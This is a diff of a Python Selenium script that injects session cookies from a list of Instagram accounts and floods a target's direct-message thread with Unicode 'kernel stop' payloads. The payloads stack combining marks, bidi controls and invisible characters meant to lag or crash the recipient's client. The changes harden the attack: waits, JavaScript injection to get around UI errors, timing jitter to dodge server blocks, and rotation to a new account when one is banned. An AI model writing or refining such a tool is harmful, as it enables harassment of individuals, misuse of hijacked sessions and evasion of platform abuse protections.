@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (ACCOUNT-ROTATOR)
-# 📅 STATUS: MULTI-SESSION | DENSITY x80 | 20-AGENT SYNC
+# 🚀 PROJECT: PRAVEER.OWNS (STABLE-ROTATOR)
+# 📅 STATUS: DENSITY x80 | ACCOUNT-ROTATION | WAIT-STABILITY
 
 import os, time, random, sys, gc, threading
 from concurrent.futures import ThreadPoolExecutor
@@ -8,14 +8,21 @@ from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 
-# --- MATRIX CONFIG ---
+# --- CONFIG ---
 THREADS_PER_MACHINE = 2
 MACHINE_ID = os.getenv("MACHINE_ID", "1")
 
 def get_kernel_stop_payload(target_name):
+    """The PRAVEER.OWNS Edition: High-style, High-lag."""
     u_id = random.randint(1000, 9999)
-    header = f"⚡ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚡\n『 𝕯𝕰𝕬𝕿𝕳 𝕾𝕰𝕹𝖀𝕾 』\n🆔 𝖀𝕴𝕯-{MACHINE_ID}-{u_id}\n"
+    header = (
+        f"⚡ 𝖕𝖗𝖆𝖛𝖊𝖊𝖗.𝖔𝖜𝖓𝖘 ⚡\n"
+        f"『 𝕯𝕰𝕬𝕿𝕳 𝕾𝕰𝕹𝖀𝕾 』\n"
+        f"🆔 𝖀𝕴𝕯-{MACHINE_ID}-{u_id}\n"
+    )
     shifter = "".join(random.choice(["\U000E0100", "\U0001D400", "\U0001D4D0", "\u2066", "\u2067"]) for _ in range(400))
     z_tower = "̸" * 800
     width_bomb = "\u2800\u00A0" * 200
@@ -38,37 +45,37 @@ def get_driver():
     return webdriver.Chrome(options=chrome_options)
 
 def agent_blitz(agent_id, cookie_list, target_id, target_name):
-    # Determine starting account based on agent ID
     account_idx = agent_id % len(cookie_list)
     
-    while True: # 🔄 AUTO-ROTATE LOOP
+    while True:
         driver = None
         current_cookie = cookie_list[account_idx].strip()
-        print(f"📡 [Agent {agent_id}] Attempting Login with Account #{account_idx}...")
+        print(f"📡 [Agent {agent_id}] Testing Account #{account_idx}...")
         
         try:
             driver = get_driver()
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': current_cookie, 'path': '/', 'domain': '.instagram.com'})
             driver.refresh()
-            time.sleep(10)
+            time.sleep(8)
             
-            # Verify Login
             if "login" in driver.current_url:
-                print(f"❌ [Agent {agent_id}] Account #{account_idx} SESSION EXPIRED. Rotating...")
+                print(f"❌ [Agent {agent_id}] Account #{account_idx} DEAD. Rotating...")
                 account_idx = (account_idx + 1) % len(cookie_list)
                 driver.quit()
                 continue
 
             driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
-            time.sleep(12)
+            
+            # ✅ STABILITY: Wait up to 30s for the UI to load
+            wait = WebDriverWait(driver, 30)
+            box = wait.until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
 
             strike_count = 0
             while True:
-                # 🚀 SEND STRIKE
-                box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                 payload = get_kernel_stop_payload(target_name)
                 
+                # Injection via JS to bypass "interactable" errors
                 driver.execute_script("""
                     var box = arguments[0];
                     document.execCommand('insertText', false, arguments[1]);
@@ -77,22 +84,19 @@ def agent_blitz(agent_id, cookie_list, target_id, target_name):
                 
                 box.send_keys(Keys.ENTER)
                 strike_count += 1
-                print(f"💀 [Agent {agent_id}] Strike {strike_count} Sent (Account #{account_idx})")
+                print(f"💀 [Agent {agent_id}] Strike {strike_count} Delivered (Acc #{account_idx})")
                 
                 driver.execute_script("window.stop();")
                 
-                # ⏳ HUMAN-LIKE JITTER (Prevents instant socket ban)
-                time.sleep(random.uniform(4, 8)) 
+                # Jitter to avoid server-side blocks
+                time.sleep(random.uniform(5, 9)) 
 
-                # Every 10 strikes, check if we need to refresh or rotate
-                if strike_count % 10 == 0:
+                if strike_count % 12 == 0:
                     driver.refresh()
-                    time.sleep(8)
-                    if "direct" not in driver.current_url: # Detect if kicked out
-                        break
+                    time.sleep(10)
 
         except Exception as e:
-            print(f"⚠️ [Agent {agent_id}] Error: {e}. Switching accounts...")
+            print(f"⚠️ [Agent {agent_id}] UI Error/Block: Rotating to next account...")
             account_idx = (account_idx + 1) % len(cookie_list)
             if driver: driver.quit()
             time.sleep(5)
@@ -103,7 +107,7 @@ def main():
     target_name = os.environ.get("TARGET_NAME", "Target").strip()
     
     if not raw_cookies or len(raw_cookies[0]) < 10:
-        print("❌ NO VALID SESSION IDS FOUND")
+        print("❌ NO SESSION IDS FOUND")
         sys.exit(1)
 
     with ThreadPoolExecutor(max_workers=THREADS_PER_MACHINE) as executor:
